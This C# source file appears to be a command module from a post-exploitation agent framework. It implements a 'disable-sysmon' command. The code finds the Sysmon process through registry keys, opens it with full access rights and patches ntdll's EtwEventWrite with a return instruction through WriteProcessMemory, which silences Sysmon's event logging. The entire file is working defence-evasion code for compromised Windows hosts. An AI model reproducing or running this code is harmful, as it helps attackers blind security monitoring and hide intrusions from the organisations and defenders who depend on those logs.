using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
using Microsoft.Win32;

namespace Agent.Commands
{
    public class DisableSysmon : AgentCommand
    {
        public override string Name => "disable-sysmon";

        public override string Execute(AgentTask task)
        {
            if (!DisableViaPatch())
                return "Failed to patch sysmon";
            return "Successfully patched sysmon";
        }
        // need to test on sysmon virtual machine.
        public static bool DisableViaPatch()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational");
            if (key == null)
            {
                return false;
            }
            if (key.GetValue("OwningPublisher") == null)
            {
                return false;
            }
            string sysmonPublisher = (string)key.GetValue("OwningPublisher");
            string path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Publishers\\" + sysmonPublisher;
            RegistryKey publisherKey = Registry.LocalMachine.OpenSubKey(path);
            string sysmonExePath = (string)publisherKey.GetValue("ResourceFileName");
            string[] sysmonExeArray = sysmonExePath.Split('\\');
            string sysmonExe = sysmonExeArray.Last();
            // enum processes
            bool found = false;
            int sysmonPid = 0;
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    if (Path.GetFileName(p.MainModule.FileName) == sysmonExe)
                    {
                        sysmonPid = p.Id;
                        found = true;
                        break;
                    }
                }
                catch (Exception)
                { }
            }
            if (!found)
                return false;
            // Do Patch
            try
            {
                IntPtr hProcess = Native.Kernel32.OpenProcess(0x001F0FFF, false, sysmonPid);
                if (hProcess == IntPtr.Zero)
                {
                    return false;
                }
                // inserting ret instruction
                byte[] patch = new byte[2];
                patch[0] = 0xC3;
                patch[1] = 0x00;
                var lib = Native.Kernel32.LoadLibrary("ntdll.dll");
                var addy = Native.Kernel32.GetProcAddress(lib, "EtwEventWrite");
                IntPtr nWrote;
                Native.Kernel32.VirtualProtectEx(hProcess, addy, patch.Length, 0x40, out uint oldProtect);
                if (!Native.Kernel32.WriteProcessMemory(hProcess, addy, patch, patch.Length, out nWrote))
                {
                    return false;
                }
                Native.Kernel32.VirtualProtectEx(hProcess, addy, patch.Length, oldProtect, out oldProtect);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
